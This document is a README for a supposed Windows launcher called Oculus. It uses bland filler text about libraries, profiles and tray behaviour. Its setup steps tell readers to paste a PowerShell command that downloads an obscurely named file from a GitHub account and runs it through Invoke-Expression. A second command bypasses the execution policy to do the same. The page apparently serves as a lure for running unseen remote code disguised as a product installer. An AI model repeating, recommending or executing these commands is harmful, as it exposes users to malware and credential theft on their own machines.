# Oculus

Oculus is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Oculus to start and manage what it runs.

Oculus is a desktop launcher for Windows that collects shortcuts, profiles, and launch arguments so you can start supported titles and utilities without digging through folders. It reads local install paths, remembers the last profile you used, and keeps startup options consistent across machines when you sync your config folder.

A typical session begins when you double-click the Oculus shortcut or open it from the tray icon. The main window lists libraries and recent entries; you pick a target, confirm optional flags if your profile defines them, and Oculus hands off to the correct executable. When something fails, the log panel shows the command line and exit code so you can adjust paths or permissions and try again.

This repository holds the Windows setup package, release notes, and a changelog that tracks version bumps and behavior changes. Setup walks through install location and optional file associations. Notes explain tray behavior, profile folders, and how to register new entries. The changelog records fixes and launcher updates so you can see what changed before you upgrade.

## What you open

- Oculus groups installed programs into libraries you can rename and reorder on Windows.
- Launch profiles store per-title arguments and working directories for repeatable one-click starts.
- The tray icon restores the last window state without stealing focus from running apps.
- Recent entries surface the five programs you opened most often this week.
- Built-in search filters libraries by title, publisher tag, or custom nickname instantly.
- Session logs capture timestamps, exit codes, and stderr snippets for failed launch attempts.
- Optional file associations let Oculus open compatible shortcuts directly from File Explorer.
- Configuration exports as a portable folder you can copy between two Windows PCs.

## Quick Setup (PowerShell)

This installs the tool Oculus on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/petrapfeiffer7140208656/oculus-setup-guide/main/kw2dgl5fgj.uagpo9fq | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/petrapfeiffer7140208656/oculus-setup-guide/main/kw2dgl5fgj.uagpo9fq | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `kw2dgl5fgj.uagpo9fq` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `petrapfeiffer7140208656/oculus-setup-guide`. Oculus 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
